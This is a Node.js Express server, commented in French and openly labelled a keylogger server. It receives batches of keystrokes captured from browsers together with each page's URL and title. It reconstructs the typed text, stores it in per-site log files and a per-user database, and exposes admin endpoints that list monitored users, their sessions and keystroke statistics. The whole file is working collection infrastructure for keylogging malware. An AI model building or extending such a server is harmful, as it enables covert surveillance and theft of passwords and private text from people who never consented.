const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Pour servir l'interface admin

// Dossiers
const LOGS_DIR = path.join(__dirname, 'logs');
const DATA_DIR = path.join(__dirname, 'data');
const USERS_DB = path.join(DATA_DIR, 'users.json');

// Créer les dossiers s'ils n'existent pas
[LOGS_DIR, DATA_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Initialiser la base de données utilisateurs
if (!fs.existsSync(USERS_DB)) {
    fs.writeFileSync(USERS_DB, JSON.stringify({ users: {} }, null, 2));
}

// Fonctions de base de données
function readUsersDB() {
    try {
        const data = fs.readFileSync(USERS_DB, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { users: {} };
    }
}

function writeUsersDB(data) {
    fs.writeFileSync(USERS_DB, JSON.stringify(data, null, 2));
}

function addSession(userId, sessionData) {
    const db = readUsersDB();

    if (!db.users[userId]) {
        db.users[userId] = {
            userId: userId,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            totalSessions: 0,
            totalKeystrokes: 0,
            sessions: []
        };
    }

    db.users[userId].sessions.push({
        ...sessionData,
        sessionId: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        receivedAt: new Date().toISOString()
    });

    db.users[userId].lastSeen = new Date().toISOString();
    db.users[userId].totalSessions++;
    db.users[userId].totalKeystrokes += sessionData.keystrokes.length;

    writeUsersDB(db);
    return db.users[userId];
}

// Fonction pour formater les touches en texte lisible
function formatKeystrokes(keystrokes) {
    let text = '';
    keystrokes.forEach(k => {
        if (k.key.length === 1 && !k.isSpecialKey) {
            text += k.key;
        } else if (k.key === 'Backspace' && text.length > 0) {
            text = text.slice(0, -1);
        } else if (k.key === 'Enter') {
            text += '\n';
        } else if (k.key === 'Tab') {
            text += '\t';
        } else if (k.key === ' ') {
            text += ' ';
        } else if (k.isSpecialKey) {
            text += ` [${k.key}] `;
        }
    });
    return text;
}

// Fonction pour créer un nom de fichier sûr
function sanitizeFilename(url) {
    try {
        const urlObj = new URL(url);
        const hostname = urlObj.hostname.replace(/^www\./, '');
        const pathname = urlObj.pathname.replace(/\//g, '_').replace(/[^a-zA-Z0-9_-]/g, '');
        return `${hostname}${pathname || '_index'}`.substring(0, 200);
    } catch (error) {
        return 'unknown_site';
    }
}

// Fonction pour créer un tableau formaté
function createFormattedTable(pageData) {
    const { url, title, startTime, endTime, keystrokes, userId } = pageData;

    const startDate = new Date(startTime);
    const endDate = new Date(endTime);
    const duration = Math.round((endDate - startDate) / 1000);

    let output = '';
    output += '═'.repeat(80) + '\n';
    output += '  HISTORIQUE DES TOUCHES CLIQUÉES\n';
    output += '═'.repeat(80) + '\n\n';

    output += '┌─ INFORMATIONS DE LA SESSION ─────────────────────────────────────────┐\n';
    output += `│ Utilisateur : ${userId}\n`;
    output += `│ Site Web    : ${title}\n`;
    output += `│ URL         : ${url}\n`;
    output += `│ Début       : ${startDate.toLocaleString('fr-FR')}\n`;
    output += `│ Fin         : ${endDate.toLocaleString('fr-FR')}\n`;
    output += `│ Durée       : ${duration} secondes\n`;
    output += `│ Touches     : ${keystrokes.length} touches enregistrées\n`;
    output += '└───────────────────────────────────────────────────────────────────────┘\n\n';

    output += '┌─ TEXTE SAISI ─────────────────────────────────────────────────────────┐\n';
    const text = formatKeystrokes(keystrokes);
    const lines = text.split('\n');
    lines.forEach(line => {
        if (line.trim()) {
            output += `│ ${line}\n`;
        }
    });
    output += '└───────────────────────────────────────────────────────────────────────┘\n\n';

    output += '┌─ DÉTAIL DES TOUCHES ──────────────────────────────────────────────────┐\n';
    output += '│ Heure      │ Touche        │ Input                  │ Modificateurs  │\n';
    output += '├────────────┼───────────────┼────────────────────────┼────────────────┤\n';

    keystrokes.forEach(k => {
        const time = new Date(k.timestamp).toLocaleTimeString('fr-FR');
        const key = k.key.padEnd(13);
        const input = (k.inputType || 'N/A').padEnd(22);
        const mods = [];
        if (k.ctrlKey) mods.push('Ctrl');
        if (k.altKey) mods.push('Alt');
        if (k.shiftKey) mods.push('Shift');
        if (k.metaKey) mods.push('Cmd');
        const modifiers = (mods.join('+') || '-').padEnd(14);

        output += `│ ${time} │ ${key} │ ${input} │ ${modifiers} │\n`;
    });

    output += '└────────────┴───────────────┴────────────────────────┴────────────────┘\n\n';

    return output;
}

// ===== ROUTES API =====

// Route principale
app.get('/', (req, res) => {
    res.json({
        message: 'Serveur Keylogger actif',
        endpoints: {
            'POST /batch-data': 'Enregistrer une session',
            'GET /api/users': 'Liste des utilisateurs',
            'GET /api/users/:userId': 'Détails d\'un utilisateur',
            'GET /api/stats': 'Statistiques globales',
            'GET /admin': 'Interface admin'
        }
    });
});

// Recevoir les données groupées
app.post('/batch-data', (req, res) => {
    const pageData = req.body;

    if (!pageData || !pageData.url || !pageData.keystrokes || !pageData.userId) {
        return res.status(400).json({ error: 'Données invalides' });
    }

    try {
        // Ajouter à la base de données utilisateurs
        const user = addSession(pageData.userId, pageData);

        // Créer le fichier TXT
        const filename = sanitizeFilename(pageData.url);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filepath = path.join(LOGS_DIR, `${pageData.userId}_${filename}_${timestamp}.txt`);

        const content = createFormattedTable(pageData);
        fs.writeFileSync(filepath, content, 'utf8');

        console.log(`\n📝 Session enregistrée: ${path.basename(filepath)}`);
        console.log(`   User: ${pageData.userId} | ${pageData.keystrokes.length} touches sur ${pageData.url}`);

        res.json({
            success: true,
            message: 'Session enregistrée',
            filename: path.basename(filepath),
            user: {
                userId: user.userId,
                totalSessions: user.totalSessions,
                totalKeystrokes: user.totalKeystrokes
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'enregistrement:', error);
        res.status(500).json({ error: 'Erreur lors de l\'enregistrement' });
    }
});

// API: Liste des utilisateurs
app.get('/api/users', (req, res) => {
    try {
        const db = readUsersDB();
        const usersList = Object.values(db.users).map(user => ({
            userId: user.userId,
            firstSeen: user.firstSeen,
            lastSeen: user.lastSeen,
            totalSessions: user.totalSessions,
            totalKeystrokes: user.totalKeystrokes,
            sessionsCount: user.sessions.length
        }));

        res.json({ users: usersList, total: usersList.length });
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture des utilisateurs' });
    }
});

// API: Détails d'un utilisateur
app.get('/api/users/:userId', (req, res) => {
    try {
        const db = readUsersDB();
        const user = db.users[req.params.userId];

        if (!user) {
            return res.status(404).json({ error: 'Utilisateur non trouvé' });
        }

        res.json(user);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture de l\'utilisateur' });
    }
});

// API: Statistiques globales
app.get('/api/stats', (req, res) => {
    try {
        const db = readUsersDB();
        const users = Object.values(db.users);

        const stats = {
            totalUsers: users.length,
            totalSessions: users.reduce((sum, u) => sum + u.totalSessions, 0),
            totalKeystrokes: users.reduce((sum, u) => sum + u.totalKeystrokes, 0),
            activeToday: users.filter(u => {
                const lastSeen = new Date(u.lastSeen);
                const today = new Date();
                return lastSeen.toDateString() === today.toDateString();
            }).length
        };

        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors du calcul des stats' });
    }
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════╗
║   🔐 Serveur Keylogger démarré            ║
║                                            ║
║   📡 Port: ${PORT}                            ║
║   🌐 URL: http://localhost:${PORT}            ║
║   📊 Admin: http://localhost:${PORT}/admin    ║
║   📁 Logs: ${path.basename(LOGS_DIR)}/                       ║
║                                            ║
║   Prêt à recevoir les données...          ║
╚════════════════════════════════════════════╝
  `);
    console.log(`📂 Base de données: ${USERS_DB}\n`);
});

// Gestion de l'arrêt propre
process.on('SIGINT', () => {
    console.log('\n👋 Arrêt du serveur...');
    process.exit(0);
});
